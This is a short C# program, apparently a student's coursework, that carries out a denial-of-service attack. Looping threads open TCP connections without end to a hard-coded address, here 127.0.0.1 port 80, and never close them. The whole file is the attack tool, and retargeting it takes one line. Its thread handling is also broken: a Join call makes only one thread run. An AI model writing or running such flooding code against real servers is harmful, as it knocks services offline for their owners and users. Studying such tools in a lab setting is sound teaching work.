using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace DOS
{
    class Program
    {
        static string student = "Adam Šárek (SAR0083)";
        static int threads = 1;
        static List<Thread> threadPool = new List<Thread>();
        static IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);
        static int clients = 0;

        static void Main(string[] args)
        {
            // Get available thread count
            ThreadPool.GetAvailableThreads(out threads, out int io);

            // Start Denial of Service
            Console.Title = "Student: " + student + ", DOS Attack IP: " + endPoint + ", Threads: " + threads;
            Console.WriteLine("Student: {0}, DOS Attack IP: {1}, Threads: {2}\n", student, endPoint, threads);
            Start();
            Console.ReadKey();
            Stop();
        }

        public static void Start()
        {
            for (int i = 0; i < threads; i++)
            {
                threadPool.Add(new Thread(Connect));
                threadPool[i].IsBackground = true;
                threadPool[i].Start();
                threadPool[i].Join();
            }
        }

        public static void Stop()
        {
            foreach (Thread thread in threadPool)
            {
                thread.Abort();
            }
        }

        public static void Connect(object obj)
        {
            while (true)
            {
                TcpClient tcpClient = new TcpClient();

                try
                {
                    tcpClient.Connect(endPoint);
                    clients++;
                }
                catch (Exception e) {
                    Console.WriteLine("Clients: {0}, Error: {1}", clients, e.Message);
                }
            }
        }
    }
}
